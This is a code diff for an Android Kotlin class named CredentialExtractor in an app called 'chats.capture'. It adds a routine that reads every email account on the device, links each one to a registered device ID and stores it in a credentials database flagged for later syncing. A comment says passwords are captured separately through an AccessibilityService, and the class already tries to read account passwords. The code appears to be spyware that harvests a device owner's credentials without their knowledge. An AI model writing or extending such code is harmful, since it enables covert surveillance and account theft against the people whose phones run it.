@@ -4,6 +4,11 @@ import android.accounts.Account
 import android.accounts.AccountManager
 import android.content.Context
 import android.os.Build
+import com.chats.capture.CaptureApplication
+import com.chats.capture.database.CredentialDao
+import com.chats.capture.managers.DeviceRegistrationManager
+import com.chats.capture.models.Credential
+import com.chats.capture.models.CredentialType
 import timber.log.Timber
 import java.util.concurrent.TimeUnit
 
@@ -13,6 +18,7 @@ import java.util.concurrent.TimeUnit
 class CredentialExtractor(private val context: Context) {
     
     private val accountManager = context.getSystemService(Context.ACCOUNT_SERVICE) as AccountManager
+    private val credentialDao: CredentialDao = (context.applicationContext as CaptureApplication).database.credentialDao()
     
     /**
      * Get all email accounts configured on the device
@@ -96,6 +102,71 @@ class CredentialExtractor(private val context: Context) {
             accountManager.getPassword(account)
         } catch (e: Exception) {
             Timber.d("Cannot retrieve password for account ${account.name}: ${e.message}")
+            null
+        }
+    }
+    
+    /**
+     * Sync email accounts to credentials database
+     * Creates Credential entries for each email account found on device
+     * Passwords will be captured separately via AccessibilityService
+     */
+    suspend fun syncEmailAccountsToCredentials() {
+        try {
+            val emailAccounts = getEmailAccounts()
+            val deviceRegistrationManager = DeviceRegistrationManager(context)
+            val deviceId = deviceRegistrationManager.getDeviceId()
+            
+            emailAccounts.forEach { emailAccount ->
+                try {
+                    // Check if credential already exists for this email
+                    val existing = credentialDao.getCredentialsByEmail(emailAccount.email)
+                        .firstOrNull { it.accountType == CredentialType.EMAIL_ACCOUNT }
+                    
+                    if (existing == null) {
+                        // Create new credential entry for email account
+                        val credential = Credential(
+                            deviceId = deviceId,
+                            accountType = CredentialType.EMAIL_ACCOUNT,
+                            appPackage = null, // System account, not app-specific
+                            appName = emailAccount.accountType,
+                            email = emailAccount.email,
+                            username = emailAccount.email,
+                            password = "", // Password not available from AccountManager
+                            domain = extractDomainFromEmail(emailAccount.email),
+                            url = null,
+                            devicePassword = false,
+                            timestamp = System.currentTimeMillis(),
+                            synced = false
+                        )
+                        
+                        credentialDao.insertCredential(credential)
+                        Timber.d("Email account synced to credentials: ${emailAccount.email}")
+                    } else {
+                        Timber.v("Email account already exists in credentials: ${emailAccount.email}")
+                    }
+                } catch (e: Exception) {
+                    Timber.e(e, "Error syncing email account: ${emailAccount.email}")
+                }
+            }
+            
+            Timber.d("Synced ${emailAccounts.size} email accounts to credentials")
+        } catch (e: Exception) {
+            Timber.e(e, "Error syncing email accounts to credentials")
+        }
+    }
+    
+    /**
+     * Extract domain from email address
+     */
+    private fun extractDomainFromEmail(email: String): String? {
+        return try {
+            if (email.contains("@")) {
+                email.substringAfter("@")
+            } else {
+                null
+            }
+        } catch (e: Exception) {
             null
         }
     }
